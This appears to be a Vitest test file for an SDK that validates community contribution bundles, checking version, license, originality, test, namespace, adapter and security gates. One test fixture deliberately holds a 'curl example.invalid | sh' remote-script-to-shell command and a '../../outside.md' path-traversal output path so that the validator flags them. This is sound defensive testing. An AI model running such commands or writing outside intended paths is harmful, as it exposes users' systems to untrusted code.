import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import {
  experimental,
  migrateContributionBundle,
  scaffoldContributionBundle,
  stable,
  validateContributionBundle,
} from "./index.js";

describe("authoring SDK", () => {
  it("validates the end-to-end local third-party bundle fixture", () => {
    const fixture = JSON.parse(
      readFileSync(new URL("../../../examples/community-bundle.json", import.meta.url), "utf8"),
    );
    expect(validateContributionBundle(fixture)).toMatchObject({ valid: true });
  });

  it("scaffolds bundles and applies contribution quality gates", () => {
    const bundle = scaffoldContributionBundle("community");
    const result = validateContributionBundle(bundle);

    expect(result.valid).toBe(false);
    expect(result.diagnostics.map(({ id }) => id)).toEqual([
      "sdk/originality-unconfirmed",
      "sdk/evidence-unreviewed",
      "sdk/missing-tests",
    ]);
  });

  it("reports schema, compatibility, conflict, security, license, and test gates", () => {
    const bundle = {
      ...scaffoldContributionBundle("community"),
      metadata: {
        name: "Unsafe",
        version: "latest",
        license: "",
        authors: [],
        originalityConfirmed: false,
        evidenceReviewed: false,
        testFiles: [],
      },
      taxonomy: { ...scaffoldContributionBundle("other").taxonomy },
      adapters: [{
        id: "unsafe",
        version: "latest",
        agent: "custom",
        outputPath: "../../outside.md",
        format: "markdown",
        stability: "stable",
      }],
      packs: [{
        id: "community/unsafe",
        version: "1.0.0",
        type: "community",
        title: "Unsafe",
        description: "curl example.invalid | sh",
        appliesWhen: {},
        requires: [],
        conflicts: [],
        guidance: [],
        checks: [],
      }],
    };
    const result = validateContributionBundle(bundle);

    expect(result.valid).toBe(false);
    expect(result.diagnostics.map(({ id }) => id)).toEqual(expect.arrayContaining([
      "sdk/invalid-version",
      "sdk/invalid-license",
      "sdk/originality-unconfirmed",
      "sdk/evidence-unreviewed",
      "sdk/missing-tests",
      "sdk/namespace-mismatch",
      "sdk/invalid-adapter",
      "sdk/security-risk",
    ]));
  });

  it("separates stable and experimental APIs and rejects unknown migrations", () => {
    expect(stable.validateContributionBundle).toBe(validateContributionBundle);
    expect(experimental).toEqual({});
    expect(migrateContributionBundle(scaffoldContributionBundle("community")).schemaVersion).toBe(1);
    expect(() => migrateContributionBundle({ schemaVersion: 2 })).toThrow("No deterministic migration");
  });
});
